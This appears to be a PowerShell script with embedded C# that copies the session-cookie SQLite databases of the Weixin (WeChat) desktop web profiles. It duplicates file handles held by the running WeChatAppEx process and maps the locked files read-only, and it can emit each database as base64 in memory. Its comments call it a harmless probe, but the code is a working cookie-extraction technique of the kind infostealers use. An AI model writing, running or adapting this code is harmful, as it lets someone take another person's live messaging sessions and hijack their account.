param([switch]$InMemory)
# Copy only the two Weixin web-profile Cookie files, using read-only mappings of
# already-open handles. No injection, process termination, or token output.
$ErrorActionPreference = 'Stop'
$profileRoot = Join-Path $env:APPDATA 'Tencent\xwechat\radium\web\profiles'
$targets = @(Get-ChildItem -LiteralPath $profileRoot -Directory | ForEach-Object {
  $candidate = Join-Path $_.FullName 'Network\Cookies'
  if ((Test-Path -LiteralPath $candidate) -and $_.Name -match '^(multitab|webview)_') { $candidate }
})
$probeRoot = Join-Path $env:LOCALAPPDATA ('CampusAgent\wechat-session-probe\' + [guid]::NewGuid().ToString('N'))
if (-not $InMemory) { New-Item -Path $probeRoot -ItemType Directory -Force | Out-Null }

Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public static class WeixinCookieSnapshot {
  [DllImport("ntdll.dll")] static extern int NtQueryInformationProcess(IntPtr p, int c, IntPtr b, uint len, out uint need);
  [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
  [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
  [DllImport("kernel32.dll", SetLastError=true)] static extern bool DuplicateHandle(IntPtr sp, IntPtr sh, IntPtr tp, out IntPtr th, uint access, bool inherit, uint options);
  [DllImport("kernel32.dll")] static extern uint GetFileType(IntPtr h);
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)] static extern uint GetFinalPathNameByHandle(IntPtr h, StringBuilder b, uint count, uint flags);
  [DllImport("kernel32.dll", SetLastError=true)] static extern bool GetFileSizeEx(IntPtr h, out long size);
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)] static extern IntPtr CreateFileMapping(IntPtr h, IntPtr sa, uint protection, uint maxHigh, uint maxLow, string name);
  [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr MapViewOfFile(IntPtr h, uint access, uint high, uint low, UIntPtr size);
  [DllImport("kernel32.dll")] static extern bool UnmapViewOfFile(IntPtr p);
  [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);

  public static string[] Copy(string[] allowedPaths, string destination, bool inMemory) {
    if (IntPtr.Size != 8) throw new Exception("This metadata probe requires a 64-bit host.");
    var allow = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
    foreach (var s in allowedPaths) allow.Add(Path.GetFullPath(s));
    var result = new List<string>();
    foreach (var process in Process.GetProcessesByName("WeChatAppEx")) {
      if (allow.Count == 0) break;
      IntPtr source = OpenProcess(0x440, false, process.Id); // QUERY_INFORMATION | DUP_HANDLE
      if (source == IntPtr.Zero) continue;
      IntPtr buffer = IntPtr.Zero;
      try {
        uint size = 65536, required;
        int status;
        for (;;) {
          buffer = Marshal.AllocHGlobal((int)size);
          status = NtQueryInformationProcess(source, 51, buffer, size, out required);
          if (status == 0) break;
          Marshal.FreeHGlobal(buffer); buffer = IntPtr.Zero;
          if (status != unchecked((int)0xC0000004) && status != unchecked((int)0xC0000023)) break;
          size = Math.Max(size * 2, required + 4096);
          if (size > 8 * 1024 * 1024) break;
        }
        if (status != 0 || buffer == IntPtr.Zero) continue;
        long count = Marshal.ReadInt64(buffer);
        if (count < 0 || count > (size - 16) / 40) continue;
        for (long i = 0; i < count && allow.Count > 0; i++) {
          IntPtr original = Marshal.ReadIntPtr(buffer, checked((int)(16 + i * 40)));
          IntPtr copy;
          // Request read rights only; the existing file pointer is never read or moved.
          if (!DuplicateHandle(source, original, GetCurrentProcess(), out copy, 0x80000000, false, 0)) continue;
          try {
            if (GetFileType(copy) != 1) continue;
            var text = new StringBuilder(2048);
            uint n = GetFinalPathNameByHandle(copy, text, (uint)text.Capacity, 0);
            if (n == 0 || n >= text.Capacity) continue;
            string file = text.ToString();
            if (file.StartsWith(@"\\?\")) file = file.Substring(4);
            if (!allow.Contains(file)) continue;
            long length;
            if (!GetFileSizeEx(copy, out length) || length < 16 || length > 1024 * 1024) continue;
            IntPtr mapping = CreateFileMapping(copy, IntPtr.Zero, 2, 0, 0, null); // PAGE_READONLY
            if (mapping == IntPtr.Zero) continue;
            try {
              IntPtr view = MapViewOfFile(mapping, 4, 0, 0, new UIntPtr((ulong)length)); // FILE_MAP_READ
              if (view == IntPtr.Zero) continue;
              try {
                var bytes = new byte[(int)length];
                Marshal.Copy(view, bytes, 0, bytes.Length);
                if (Encoding.ASCII.GetString(bytes, 0, 16) != "SQLite format 3\0") continue;
                string label = new DirectoryInfo(Path.GetDirectoryName(Path.GetDirectoryName(file))).Name.Split('_')[0];
                string output;
                if (inMemory) {
                  output = label + "|" + Convert.ToBase64String(bytes);
                } else {
                  output = Path.Combine(destination, label + "-Cookies.sqlite");
                  File.WriteAllBytes(output, bytes);
                }
                Array.Clear(bytes, 0, bytes.Length);
                result.Add(output);
                allow.Remove(file);
              } finally { UnmapViewOfFile(view); }
            } finally { CloseHandle(mapping); }
          } finally { CloseHandle(copy); }
        }
      } finally {
        if (buffer != IntPtr.Zero) Marshal.FreeHGlobal(buffer);
        CloseHandle(source);
        process.Dispose();
      }
    }
    return result.ToArray();
  }
}
'@
$copies = [WeixinCookieSnapshot]::Copy([string[]]$targets, $probeRoot, [bool]$InMemory)
if ($InMemory) { $copies; return }
[pscustomobject]@{targetCount=$targets.Count;snapshotCount=$copies.Count;files=$copies;cookieValuesPrinted=$false} | ConvertTo-Json -Depth 3
